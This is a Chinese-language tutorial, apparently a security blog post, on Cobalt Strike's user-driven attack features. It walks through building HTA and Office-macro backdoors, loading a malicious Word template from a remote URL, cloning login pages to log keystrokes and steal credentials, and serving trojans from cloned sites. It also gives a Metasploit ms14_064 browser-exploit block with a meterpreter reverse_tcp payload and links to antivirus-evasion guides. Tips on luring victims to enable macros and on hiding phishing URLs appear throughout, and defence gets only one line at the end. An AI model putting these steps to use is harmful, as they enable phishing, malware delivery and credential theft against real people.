## 用户驱动攻击

用户驱动攻击`User-Driven Attacks`，利用人这个"安全漏洞"进行攻击，也就是说需要欺骗用户产生交互才行，但这种方式也有许多的优点

  * 用户驱动攻击不包含恶意攻击代码，所以用户系统上的安全补丁是没用的；

  * 无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；

  * 用户驱动攻击十分可靠。

当我们采取行动来追踪并需要攻击时，它就像用户本地执行程序一样，CS为我们提供了几个用户驱动攻击的选项，分别如下。

### 用户驱动攻击包(生成后门)

![image-20211130181627596](https://image.3001.net/images/20211204/1638617747_61ab529344d0931b93222.png!small)

用户驱动攻击包`User-Driven Attacks Packages`功能打开位置：`Attacks --> Packages`

####  **1.HTML应用**

HTML应用`HTML
Application`生成(executable/VBA/powershell)这3种原理不同的VBScript实现的`evil.hta`文件

使用方法：

  1. 创建一个Beacon HTTP 监听器；

  2. 工具栏攻击->生成后门->HTMLApplication；

![image-20211130200317843](https://image.3001.net/images/20211204/1638617778_61ab52b20e7290fe1a92c.png!small)

  3. 后门文件通过漏洞传到Victim执行，CS随后上线（如果无法上线可以换一个Method生成后门文件）。

####  **2.1Microsoft Office 宏文件**

Microsoft Office 宏文件`Microsoft Office Document
Macros`可以生成恶意宏放入office文件，非常经典的钓鱼攻击手法，CS给出的操作步骤也很详细

  1. 创建一个Beacon HTTP 监听器；

  2. 工具栏攻击->生成后门->MS office macro；

![image-20211130201804012](https://image.3001.net/images/20211204/1638617786_61ab52baa6cd95dbdc7ea.png!small)

  3. 新建Word文档或者Excel表格，按照以下步骤将宏添加到Microsoft Word或者Excel。

    1. 打开Word或者Excel，转到视图->宏->查看宏

    2. 在宏名处输入随意一个名字，点击创建

    3. 清除编辑器内原有的全部宏代码，点击CS步骤提示中的`Copy Macro`按钮将宏复制到剪贴板

    4. 粘贴到Word中的窗口，关闭宏编辑器窗口

    5. 会提示无法保存窗口选择否，将文档另存为启用宏的文档，保存成.dotm或.docm都可以，这两个文件格式都是启用宏的Word格式

![image-20211130203140853](https://image.3001.net/images/20211204/1638617798_61ab52c665e67cab43057.png!small)

右侧是启动宏的文档，图标还是有差别的，所以说遇到这种文档不要点启用内容（实际钓鱼中要诱导点击）

![image-20211130203300848](https://image.3001.net/images/20211204/1638617805_61ab52cdf09aca530e8c4.png!small)

![image-20211130203432105](https://image.3001.net/images/20211204/1638617811_61ab52d3efeb3b8257f60.png!small)

如果Victim点击了启用内容，CS中直接上线，process为rundll32.exe

![image-20211130203542375](https://image.3001.net/images/20211204/1638617820_61ab52dc99b30c4ad489c.png!small)

rundll32.exe：

  * rundll32的正常位置：c:\windows\system32

  * 作用是以命令行的方式调用执行DLL文件中的内部函数，这样在进程当中，只会有 Rundll32.exe，而不会有DLL后门的进程，实现隐蔽的目的

因为rundll32.exe需要调用DLL文件，如果Victim电脑中存在杀毒软件将会被直接Kill掉，所以需要免杀

![image-20211130204735342](https://image.3001.net/images/20211204/1638617829_61ab52e53d17ffd915104.png!small)

这是最基本的宏病毒文档当然还有其他利用宏的方法

#### 2.2宏文件远程加载恶意Word模板文件

利用Word文档加载附加模板时的缺陷所发起的恶意请求而达到的攻击目的，当受害者点开攻击者发给他的恶意word文档就会向远程服务器请求恶意模板并执行恶意模板上的恶意代码，从而上线CS

基本方法还是一样的

  1. 创建一个Beacon HTTP 监听器，生成并复制宏

  2. 新建word文档，在工具栏的空白区域右键，点击自定义功能区

![image-20211130205931269](https://image.3001.net/images/20211204/1638617836_61ab52ec68674e7bc3e36.png!small)

开启开发工具

![image-20211130210020141](https://image.3001.net/images/20211204/1638617845_61ab52f55bd61bbbe70d7.png!small)

点击确定后，word的工具栏就多了一个开发工具，点击开发工具中的“Visual basic”，将恶意的宏代码粘贴到project中

![image-20211130210319458](https://image.3001.net/images/20211204/1638617854_61ab52feb64ba0871b442.png!small)

将文档另存为dotm模板文件

![image-20211130210617866](https://image.3001.net/images/20211204/1638617861_61ab530559ad7787e49e6.png!small)

其实直接右击这个文档用word打开（双击打不开）就可以让主机上线，为了提升隐蔽性，可以远程加载此文件

  3. 将带有宏的模板文件上传到服务器（也可以上传到github），确保受害者Victim可以访问

http://10.242.192.62/test.dotm

  4. word中新建一个带模板的docx文件，保存，把这个文件docx后缀名改为zip后缀（tips：docx本来就是zip文件哈），解压后可以看到文件

![image-20211130215241487](https://image.3001.net/images/20211204/1638617868_61ab530c547504001f3c8.png!small)

找到word路径下的_rels目录再找到settings.xml_rels文件，用记事本打开可以发现加载了远程的模板网站

![image-20211130215441027](https://image.3001.net/images/20211204/1638617876_61ab531445a8bc307c7fb.png!small)

把恶意的模板url拼接?raw=true，替换原来的url

http://10.242.192.62/test.dotm?raw=true

  5. 将解压的文件夹再次压缩为zip文件，再将后缀改为docx，这样远程加载钓鱼文件就生成了

发送给受害者当用户使用word打开文件便会上线

> word开启或禁用宏：文件——>选项——>信任中心——>信任中心设置
>
> 默认情况下是“禁用所有宏，并发出通知”，这种情况下，当我们打开恶意文件时，会询问你是否“启用内容”

如果受害者安装了杀毒软件，还是会被杀掉，需要做免杀才行

免杀教程(用到的工具EvilClippy已经有些过时了)：

  * <https://www.cnblogs.com/Cl0ud/p/13838071.html>

  * <https://cloud.tencent.com/developer/article/1824072>

  * 原理：[免杀基础入门篇](https://xz.aliyun.com/t/10369)

  * [远控免杀从入门到实践](https://www.freebuf.com/articles/system/227461.html)

#### 3.Payload 生成器

![image-20211130222110755](https://image.3001.net/images/20211204/1638617884_61ab531c5525d39bfb379.png!small)

Payload生成器`Payload Generator`可以生成各种语言版本的Payload，便于进行免杀

#### 4.Windows 可执行文件

![image-20211130222023488](https://image.3001.net/images/20211204/1638617889_61ab53213418113040345.png!small)

Windows 可执行文件`Windows Executable`会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64
payload stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb)

 **Windows 可执行文件（Stageless）**

Windows 可执行文件（Stageless）`Windows Executable
(Stageless)`会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless
表示把包含payload在内的"全功能"被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb)
becon.ps1(351kb)

### 用户驱动的Web交付攻击(钓鱼攻击)

用户驱动Web交付攻击`User-Driven Web Drive-by Attacks`功能打开位置：`Attacks --> Web Drive-by`

![image-20211130183355993](https://image.3001.net/images/20211204/1638617894_61ab5326646c12b79fdae.png!small)

#### 1.web服务管理

web服务器管理`web server Manage``中可以查看可使用的模块

![image-20211201155429096](https://image.3001.net/images/20211204/1638617899_61ab532b965f4c785c64b.png!small)

#### 2.克隆网站

会把目标网站前端爬下来生成一个钓鱼界面

 **键盘记录**

比如克隆一个需要登陆的网站通过记录目标用户键盘输入的信息，拿到账号和密码

首先生成克隆网站 攻击->钓鱼攻击->克隆网站

![image-20211201182311978](https://image.3001.net/images/20211204/1638617907_61ab5333534f190ce1fb7.png!small)

在克隆网站时不要找这种加载登录二维码的这种，就找个页面简单的，可以找手机页面发送给受害者因为一般手机打开是看不到的URL的

![image-20211201182254276](https://image.3001.net/images/20211204/1638617914_61ab533a1fb49fc304ee5.png!small)

用户键盘输入的信息都可以在web日志中看到

![image-20211201163859793](https://image.3001.net/images/20211204/1638617920_61ab53406f76617d9f34b.png!small)

#### 4.2克隆网站联动MSF

克隆网站也可以与MSF联动，在生成钓鱼网站处Attack选择MSF攻击URL即可

    
    
    # MSF payload只是适用于IE浏览器
    use exploit/windows/browser/ms14_064_ole_code_execution
    set srvhost 192.168.179.138
    set SRVPORT 8888
    set payload windows/meterpreter/reverse_tcp
    set lhost 192.168.179.128
    exploit
    

会生成一个URL，将这个URL放入Attack中

![image-20211201182012502](https://image.3001.net/images/20211204/1638617926_61ab53469ed19a8dc7c37.png!small)

当受害人访问时就会加载恶意URL，进行溢出攻击，与文件托管相比无需下载文件但仅适用于受害者以IE浏览器打开

#### 4.文件托管(下载)

通过`Attacks --> Web Drive-by --> Host
File`进行配置，攻击者可以通过这个功能将文件上传到CS服务端上，从而进行文件托管

如果想删除上传到CS服务端上的文件，可以到`Attacks --> Web Drive-by --> Manage`下进行删除

如果想查看谁访问了这些文件，可以到`View --> Web Log`下进行查看

结合克隆网站使用，用户访问恶意网站时会下载文件，如果执行就上线CS

首先生成文件下载 攻击->钓鱼攻击->文件下载，选择本地木马文件

![image-20211201170848300](https://image.3001.net/images/20211204/1638617954_61ab5362f05bbe83b4172.png!small)

然后生成克隆网站 攻击->钓鱼攻击->克隆网站

Attack选择刚才的文件下载，不需要勾选键盘记录

![image-20211201170954730](https://image.3001.net/images/20211204/1638617959_61ab536706bb6eca7e88a.png!small)

当受害者打开URL时，页面是百度，同时会自动下载文件，如果用户打开即会上线CS

![image-20211201171236838](https://image.3001.net/images/20211204/1638617964_61ab536cdd0527ef2fb06.png!small)

#### 5.Applet 攻击

 **java 签名 applet 攻击(过时)**

java 签名 applet 攻击`Java Signed Applet Attack`会启动一个Web服务以提供自签名Java
Applet的运行环境，浏览器会要求用户授予applet运行权限，如果用户同意则实现控制，但目前该攻击方法已过时

 **Java 智能 Applet 攻击(过时)** **

Java 智能 Applet 攻击`Java Smart Applet
Attack`会自动检测Java版本并利用已知的漏洞绕过安全沙箱，但CS官方称该攻击的实现已过时，在现在的环境中无效

#### 6.信息收集

![image-20211201155824856](https://image.3001.net/images/20211204/1638617970_61ab53729cdba7ffb7089.png!small)

建立一个钓鱼页面去收集用户信息，其中主机地址和端口就是TeamServerIP和端口，RedirectUrl就是点击后跳转的URL，可以填一个大型网站，底下的使用JavaApplet复选框也已经过时对于受害者系统版本较低的情况下可以使用，点击开始后会生成URL，只要诱导用户访问即上线

用户访问后跳转到百度

![2](https://image.3001.net/images/20211204/1638617978_61ab537ade9162375261d.gif!small)

在CS->视图->应用信息可以看到收集的信息

![image-20211201160956739](https://image.3001.net/images/20211204/1638617989_61ab538535689230d17d4.png!small)

### 防范

 **攻击防范** ：提升用户安全意识，不要乱点连接乱下文件，安装杀毒软件

